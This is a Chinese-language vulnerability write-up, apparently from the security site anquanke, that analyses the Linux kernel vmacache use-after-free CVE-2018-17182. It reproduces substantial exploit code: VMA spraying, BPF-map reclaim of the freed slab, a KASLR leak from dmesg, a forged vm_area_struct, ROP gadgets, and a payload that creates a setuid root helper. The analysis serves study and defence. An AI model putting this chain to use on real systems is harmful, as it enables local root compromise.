@@ -1,0 +1,479 @@
+# CVE-2018-17182 VMA use-after-free 详解
+
+阅读量 **268491**
+
+|评论 **12**
+
+|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)
+
+发布时间 : 2018-10-17 10:00:31
+
+ **x**
+
+##### 译文声明
+
+本文是翻译文章
+
+译文仅供参考，具体内容表达以及含义原文为准。
+
+![](https://p1.ssl.qhimg.com/t0172040541e73a99f8.png)
+
+## 漏洞分析
+
+内核在3.16版本之后对vma的查找进行了优化:<https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=615d6e8756c87149f2d4c1b93d471bca002bd849>
+
+###  新的vma缓存机制
+
+在task_struct中加入了一个vmacache数组和一个32位的vmacache_seqnum值。在mm_struct结构中加入了一个32位vmacache_seqnum值，并且在此基础上定义了一系列操作函数  
+  
+vmacache_invalidate函数，用来将mm_struct的vmacache_seqnum加一，使其不等于当前线程的current->vmacache_seqnum。  
+
+vmacache_find  
+更新了vma_find函数，在这个位置会调用vmacache_find  
+  
+vmacache_find  
+vmacache_find检索当前线程的vmacache缓存数组，如果地址范围在其中某一个vma的地址范围中，直接返回这个vma，不需要再进行红黑树检索  
+vmacache_find还会调用vmacache_valid，在其中会检查current->vmacache_seqnum是否等于current->mm->vmacache_seqnum，如果之前有过调用vmacache_invalidate，在这里会直接去调用vmacache_flush函数，刷新task_struct的vmacache链表之后会返回null。  
+
+![](https://p0.ssl.qhimg.com/t01d313f5fb7c43aa21.jpg)
+
+###  漏洞具体位置
+
+但是这个32位的值是可以被溢出的，于是在vmacache_invalidate中会有溢出的检查，如果回到0，就会刷新vmacache缓存数组。  
+本来这套机制是没有问题的，但是溢出后每次刷新线程的vmacache数组都需要遍历所有线程，太耗费时间  
+  
+于是又发布了一次新的更新，如果是单线程的话不用对其刷新，直接返回。  
+
+但是这样就存在一个问题，如果在溢出之后，在调用vmacache_valid之前，立即申请一个新线程。这个时候之前的单线程的current->vmacache_seqnum仍然为0xffffffff，并没有更新为0。因为线程虽然没一个线程都有一个单独的task_struct，但是是共享同一个mm_struct的，这个时候在另一个新创建的线程之中将mm_struct的seqnum刷新为0xffffffff，在先前的但线程中就可以利用其vmacache数组里面已经释放了的vma，实现use
+after free。
+
+我们再来看看mmap和munmap函数是如何改变seqnum的值。  
+  
+
+也就是说，调用munmap去解除vma映射的时候，会调用vmacache_invalidate将相应的mm_struct的seqnum增加1。并且最后会调用  
+kmem_cache_free(vm_area_cachep, vma)将对应的vm_area_struct free掉使其回到slab分配器的free
+list。
+
+![](https://p4.ssl.qhimg.com/t016a8c5d25915e8468.jpg)
+
+![](https://p1.ssl.qhimg.com/t01b6f760157c95d6b1.jpg)
+
+并且再mummap开始的时候会调用find_vma，这会更新vmacache或者是刷新它。  
+  
+再来看mmap函数：在其中会调用mmap_region,然后调用  
+  
+其中会调用vm_area_alloc，在其中调用kmem_cache_zalloc()。这个函数主要用于向内核的slab分配器分配专门大小的object。
+
+## 漏洞利用
+
+现在我们结合着漏洞发现者在github上贴出的具体的漏洞利用代码去分析一下具体的利用过程。
+
+漏洞利用代码<https://github.com/jas502n/CVE-2018-17182>
+
+我们首先将作者的代码定义的每个函数具体功能进行分析，之后结合漏洞进行总体的串联
+
+漏洞发现者的利用代码实现了一套ioctl系统来辅助漏洞的利用,其中关键的cmd是DMESG_DUMP用来调用vmacache_debug_dump()实现dump当前mm结构的信息，SEQUENCE_BUMP，用来更新当前线程mm_struct的seqnum。
+
+    
+    
+      case DMESG_DUMP: {
+      vmacache_debug_dump();
+      return 0;
+    } break;
+    case SEQUENCE_BUMP: {
+      current->mm->vmacache_seqnum += arg;
+      return 0;
+    } break;`
+    
+
+vmacache_debug_dump():
+
+    
+    
+    void vmacache_debug_dump(void)
+    {
+     struct mm_struct *mm = current->mm;
+     struct task_struct *g, *p;
+     int i;
+    
+     pr_warn("entering     vmacache_debug_dump(0x%lx)n", (unsigned long)mm);
+     pr_warn("  mm sequence: 0x%xn", mm->vmacache_seqnum);
+     rcu_read_lock();
+     for_each_process_thread(g, p) {
+       if (mm == p->mm) {
+         pr_warn("  task 0x%lx at 0x%x%sn", (unsigned long)p,
+       p->vmacache.seqnum,
+       (current == p)?" (current)":"");
+     pr_warn("    cache dump:n");
+     for (i=0; i<VMACACHE_SIZE; i++) {
+       unsigned long vm_start, vm_end, vm_mm;
+       int err = 0;
+    
+       pr_warn("      0x%lxn",
+         (unsigned long)p->vmacache.vmas[i]);
+       err |= probe_kernel_read(&vm_start,
+         &p->vmacache.vmas[i]->vm_start,
+         sizeof(unsigned long));
+       err |= probe_kernel_read(&vm_end,
+         &p->vmacache.vmas[i]->vm_end,
+         sizeof(unsigned long));
+       err |= probe_kernel_read(&vm_mm,
+         &p->vmacache.vmas[i]->vm_mm,
+         sizeof(unsigned long));
+       if (err)
+         continue;
+       pr_warn("        start=0x%lx end=0x%lx mm=0x%lxn",
+         vm_start, vm_end, vm_mm);
+         }
+       }
+     }
+    
+
+再看puppet.c  
+首先我们有一个全局变量sequence_mirror，用于标记mm_struct的seqnum的值
+
+    
+    
+    static void sequence_double_inc(void) {
+        mmap(FAST_WRAP_AREA + PAGE_SIZE, PAGE_SIZE, PROT_RW, MAP_PRIV_ANON|MAP_FIXED, -1, 0);
+        sequence_mirror += 2;
+    }
+    static void sequence_inc(void) {
+        mmap(FAST_WRAP_AREA, PAGE_SIZE, PROT_RW, MAP_PRIV_ANON|MAP_FIXED, -1, 0);
+        sequence_mirror += 1;
+    }
+    
+
+这两个函数分别用于将mm_struct->vmacache_seqnum的值分别增加2和1。具体的原理是
+首先在main函数中创建一个三个页的匿名映射。之后通过带有MAP_FIXED的mmap去申请第一页或者中间页的映射。如果是中间页，则会munmap开头和结尾两页，造成seqnum的两次递增。之后再进行合并。同理，开头一页的话则会造成一次递增。
+
+    
+    
+    static void sequence_target(long target) {
+        while (sequence_mirror + 2 <= target)
+            sequence_double_inc();
+        if (sequence_mirror + 1 <= target)
+            sequence_inc();
+    }
+    
+
+这个函数用于将sequence_mirror递增到指定值。
+
+再来说说利用代码里面的进程之间通信的机制：
+
+    
+    
+    int control_event_fd = eventfd(0, EFD_SEMAPHORE);
+    if (control_event_fd == -1) err(1, "eventfd");
+    if (socketpair(AF_UNIX, SOCK_DGRAM, 0, control_fd_pair))
+        err(1, "socketpair");
+    pid_t child = fork();
+    if (child == -1) err(1, "fork");
+    if (child == 0) {
+        prctl(PR_SET_PDEATHSIG, SIGKILL);
+        close(kmsg_fd);
+        close(control_fd_pair[0]);
+        if (dup2(control_fd_pair[1], 0) != 0) err(1, "dup2");
+        close(control_fd_pair[1]);
+        if (dup2(control_event_fd, 1) != 1) err(1, "dup2");
+        execl("./puppet", "puppet", NULL);
+        err(1, "execute puppet");
+    }
+    close(control_fd_pair[1]);
+    
+    int bpf_map = recvfd(control_fd_pair[0]);
+    
+
+分别创建了eventfd和socketpair。并切将其重新定向为0和1。前者用于将子进程阻塞，在主进程中实现了将fake
+vma伪造完后发送信号让子进程继续去触发缺页异常，从而实现对控制流控制。后者定义了双向的套接字，用于将我们申请的bpf_map传回。bpf_map会在后文进行分析。
+
+现在我们具体分析漏洞利用流程
+
+在main函数中，我们在实现一系列初始化之后创建子进程，并在其中
+
+    
+    
+    execl("./puppet", "puppet", NULL);
+    
+
+在puppet中，我们首先申请一个三页的mmap匿名映射，用于增加mm—>vmacache_seqnum。
+
+之后在不创建线程的前提下先将mm的seqnum更新为0x100000000L – VMA_SPAM_COUNT/2
+
+    
+    
+    sequence_cheat_bump(0xffff0000L);
+    sequence_target(0x100000000L - VMA_SPAM_COUNT/2);
+    
+
+之后我们申请5000个mmap映射，根据之前的分析，在slab分配器中也分配了5000个vm_area_struct。
+
+    
+    
+    for (unsigned long i=0; i<VMA_SPAM_COUNT; i++) {
+        mmap(VMA_SPAM_AREA + i * VMA_SPAM_DELTA, PAGE_SIZE, PROT_RW, MAP_PRIV_ANON, -1, 0);
+    }
+    
+
+紧接着我们mummap
+VMA_SPAM_COUNT/2个映射。释放了5000个vm_area_struct到slab的freelist上。这时，mm->vmacache_seqnum已经被溢出变成了0。而且current->vmacache缓存数组保存着我们最后一次mummap所释放的vma结构。由于是但线程，所以并没有flush
+vmacache数组给了我们use after free的条件。
+
+    
+    
+    for (unsigned long i=0; i<VMA_SPAM_COUNT/2; i++) {
+        munmap_noadjacent(VMA_SPAM_AREA + i * VMA_SPAM_DELTA, PAGE_SIZE);
+    }
+    
+
+之后，我们在没有调用任何vma_find的情况下，马上申请新的线程，在新线程中：  
+我们首先munmap掉5000个映射，也就是释放了5000个vma struct，这样，我们会将整个的vma slab全部变成free，从而将这个slab
+释放回伙伴系统。
+
+    
+    
+    for (unsigned long i=VMA_SPAM_COUNT/2; i<VMA_SPAM_COUNT; i++) {
+        munmap_noadjacent(VMA_SPAM_AREA + i * VMA_SPAM_DELTA, PAGE_SIZE);
+    }
+    
+
+之后们通过bpf map，将包含着我们主线程vmacache缓存数组中没有flush的vma结构的一整页全部申请出来，这样就可以通过bpf
+map去修改还没有flush的vma结构。之后我们触发一个缺页异常，回在主线程中调用我们的这个vma结构中的异常处理程序，从而实现执行流程的劫持。
+
+    
+    
+    struct bpf_map_create_args bpf_arg = {
+        .map_type = 2,
+        .key_size = 4,
+        .value_size = 0x1000,
+        .max_entries = 1024
+    };
+    int bpf_map = syscall(321, 0, (unsigned long)&bpf_arg, sizeof(bpf_arg), 0, 0, 0);
+    
+    sendfd(0, bpf_map);
+    
+
+再来看bpf的特性：bpf会将分配的内存清空。这个特性正好帮助我们触发warn_on_once,以此来将信息dump到dmesg中，方便我们读取。  
+bpf具体的用法：  
+调用syscall(__NR_bpf, BPF_MAP_CREATE, &attr,
+sizeof(attr))申请创建一个map，在attr结构体中指定map的类型、大小、最大容量等属性。  
+之后通过bpf函数带BPF_MAP_UPDATE_ELEM参数去更新内存的内容。
+
+###  如何绕过kaslr？
+
+如果写入eventfd将会触发usercopy，使R8仍然包含指向eventfd_fops结构的指针
+
+    
+    
+    syscall(1, sync_fd, 0x7fffffffd000, 8, 0, 0, 0);
+    
+
+并且我们通过vmacache_find()去搜索0x7fffffffd000是否在我们的vmacache缓存中。
+
+我们来看4.18的vmacache_find函数  
+首先查看vma是否为null，因为我门之前的一系列工作，vma非空。之后warn_on_once,因为我们的bpfmap的申请已经把整页清零，所以这里一定会触发WARN_ON_ONCE(),仅会在第一次触发时打印调试信息，并且继续执行。因此这里的vma仅仅会返回null，并且回到红黑树查找，并不会将系统崩溃。如此，我们可以获得dmesg的各种调试信息。
+
+vma的地址在rax中，mm_struct的地址位于rdi中，同时还有r8中泄漏的eventfd_fops用来绕过kaslr。
+
+    
+    
+    while (1) {
+        char *ptr;
+        int res = read(kmsg_fd, buf, sizeof(buf)-1);
+        if (res <= 0) err(1, "unexpected kmsg end");
+        buf[res] = '';
+        if (state == 0 && strstr(buf, "WARNING: ") && strstr(buf, " vmacache_find+")) {
+            state = 1;
+            printf("got WARNINGn");
+        }
+        if (state == 1 && (ptr = strstr(buf, "RSP: 0018:"))) {
+            rsp = strtoul(ptr+10, NULL, 16);
+            printf("got RSP line: 0x%lxn", rsp);
+        }
+        if (state == 1 && (ptr = strstr(buf, "RAX: "))) {
+            vma_kaddr = strtoul(ptr+5, NULL, 16);
+            printf("got RAX line: 0x%lxn", vma_kaddr);
+        }
+        if (state == 1 && (ptr = strstr(buf, "RDI: "))) {
+            mm = strtoul(ptr+5, NULL, 16);
+            printf("got RDI line: 0x%lxn", mm);
+        }
+        if (state == 1 && strstr(buf, "RIP: 0010:copy_user_generic_unrolled")) {
+            state = 2;
+            printf("reached WARNING part 2n");
+        }
+        if (state == 2 && (ptr = strstr(buf, "R08: "))) {
+            eventfd_fops = strtoul(ptr+5, NULL, 16);
+            printf("got R8 line: 0x%lxn", eventfd_fops);
+            state = 3;
+        }
+        if (state > 0 && strstr(buf, "---[ end trace"))
+            break;
+    }
+    
+
+###  rop chain
+
+利用我们之前通过dmesg泄漏的地址，最终我们需要伪造一个vma结构，其中的几个关键点是：vm_start和vm_end,vm_start必须设置0x7fffffffd000或者是随便一块没有被映射的区域，这样我们在解应用这块区域去触发页错误的时候，我们会找到我们伪造的vma。
+
+第二个关键点是vm_ops，我们将会在子进程中调用eventfd来阻塞，直到我们在将fake
+vma写入到我们的bpf之后，在阻塞完毕之后，主进程再次阻塞。这个时候我们的子进程解引用一个没有建立页表映射的内存位置，触发缺页异常。因为我们之前已经伪造了vm_start，这个时候我们会触发
+__do_fault函数，在其中调用我们伪造的vma的vm_ops的falut函数。  
+我们仔细来看伪造的vm_area_struct和payload。
+
+    
+    
+    char kernel_cmd[8] = "/tmp/%1";
+    struct vm_area_struct fake_vma = {
+        .vm_start = 0x7fffffffd000,
+        .vm_end = 0x7fffffffe000,
+        .vm_rb = {
+            .__rb_parent_color =
+                (eventfd_fops-0xd92ce0), //run_cmd: 0xffffffff810b09a0
+            .rb_right = vma_kaddr
+                + offsetof(struct vm_area_struct, vm_rb.rb_left)
+            /*rb_left reserved for kernel_cmd*/
+        },
+        .vm_mm = mm,
+        .vm_flags = VM_WRITE|VM_SHARED,
+        .vm_ops = vma_kaddr
+            + offsetof(struct vm_area_struct, vm_private_data)
+            - offsetof(struct vm_operations_struct, fault),
+        .vm_private_data = eventfd_fops-0xd8da5f,
+        .shared = {
+            .rb_subtree_last = vma_kaddr
+                + offsetof(struct vm_area_struct, shared.rb.__rb_parent_color)
+                - 0x88,
+            .rb = {
+                .__rb_parent_color = eventfd_fops-0xd9ebd6
+            }
+        }
+    };
+    
+
+vm_ops的位置是
+
+    
+    
+        .vm_ops = vma_kaddr
+            + offsetof(struct vm_area_struct, vm_private_data)
+            - offsetof(struct vm_operations_struct, fault),
+    
+
+vma_kaddr的值就是我们通过dmesg获得的已经失效的vma缓存的地址，也就是我们将要通过bpf伪造的vma，这样的话我们调用vm->vm_ops->fault就是等于调用了
+vma_kaddr + offsetof(struct vm_area_struct,
+vm_private_data)，而这个值在我们伪造的vma中是vm_private_data，我们已经将其伪造成了内核rop：
+
+    
+    
+    ffffffff810b5c21: 49 8b 45 70           mov rax,QWORD PTR [r13+0x70]
+    ffffffff810b5c25: 48 8b 80 88 00 00 00  mov rax,QWORD PTR [rax+0x88]
+    ffffffff810b5c2c: 48 85 c0              test rax,rax
+    ffffffff810b5c2f: 74 08                 je ffffffff810b5c39
+    ffffffff810b5c31: 4c 89 ef              mov rdi,r13
+    ffffffff810b5c34: e8 c7 d3 b4 00        call ffffffff81c03000 <__x86_indirect_thunk_rax>
+    
+
+<__x86_indirect_thunk_rax>就是等于是 call
+rax，而rax的值是r13+0x88，r13的值就是我们伪造的vma的地址。也就是call vma struct+0x88的位置，
+
+在这个位置是
+
+    
+    
+    .rb = {
+                .__rb_parent_color = eventfd_fops-0xd9ebd6
+            }
+    
+
+我们放上来另一个内核rop
+
+    
+    
+    ffffffff810a4aaa: 48 89 fb              mov rbx,rdi
+    ffffffff810a4aad: 48 8b 43 20           mov rax,QWORD PTR [rbx+0x20]
+    ffffffff810a4ab1: 48 8b 7f 28           mov rdi,QWORD PTR [rdi+0x28]
+    ffffffff810a4ab5: e8 46 e5 b5 00        call  ffffffff81c03000<__x86_indirect_thunk_rax>
+    
+
+这里我们将call
+vma+0x20,参数是vma+0x28,我们已经在结构中伪造了将vma+0x20是run_cmd,vma+0x28也就是vm_rb.rb_left的值是”/tmp/%1”  
+而这里面我们早就写入了
+
+    
+    
+        char *suid_tmpl = "#!/bin/shn"
+                  "chown root:root ./suidhelpern"
+                  "chmod 04755 ./suidhelpern"
+                  "while true; do sleep 1337; donen";
+    
+
+这样直接给suidhelper以root权限。
+
+之后我们伪造一个fake page，offset的值是
+
+    
+    
+        if (offset + sizeof(fake_vma) <= 0x1000) {
+        memcpy(fake_vma_page + offset, &fake_vma, sizeof(fake_vma));
+    } else {
+        size_t chunk_len = 0x1000 - offset;
+        memcpy(fake_vma_page + offset, &fake_vma, chunk_len);
+        memcpy(fake_vma_page, (char*)&fake_vma + chunk_len, sizeof(fake_vma) - chunk_len);
+    }
+    
+
+offset的值我们通过
+
+    
+    
+    long offset = (vma_kaddr - 0x90/*compensate for BPF map header*/) & 0xfff;
+    
+
+得倒，因为我们要的是在这个页中的偏移位置，所以需要 &0xfff就是在这个页的偏移量。但是还需要减去0x90 bpf map header，因为bpf
+update的时候会自动加上偏移量。
+
+这样我们需要的东西已经全部准备好，直接通过
+
+    
+    
+    bpf_(BPF_MAP_UPDATE_ELEM, &update_attr)
+    
+
+将伪造好的页写入到内核，即可将我们在vmacache中的vma覆盖掉。之后通过触发缺页异常去执行vm_ops->的fault，从而实现整个rop chain
+的利用。之后我们的主进程虽然会崩溃掉，但是我们已经以root权限打开了新的可执行文件sulidhelper，在其中弹出一个shell，实现了内核态的提权。
+
+## 参考链接
+
+<https://googleprojectzero.blogspot.com/2018/09/a-cache-invalidation-bug-in-linux.html>
+
+本文翻译自 [原文链接]()。如若转载请注明出处。
+
+商务合作，文章发布请联系 anquanke@360.cn
+
+本文由 **张政** 原创发布
+
+转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
+[https://www.anquanke.com/post/id/161632](/post/id/161632)
+
+安全客 - 有思想的安全新媒体
+
+本文转载自: []()
+
+如若转载,请注明出处： []()
+
+安全客 - 有思想的安全新媒体
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
+  * [linux内核安全](/tag/linux内核安全)
+  * [CVE-2018-17182](/tag/CVE-2018-17182)
+
+ **+1** __7赞
+
+ __收藏
+
+![](https://p2.ssl.qhimg.com/t01ef60cd28c96aa542.jpg) 张政
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
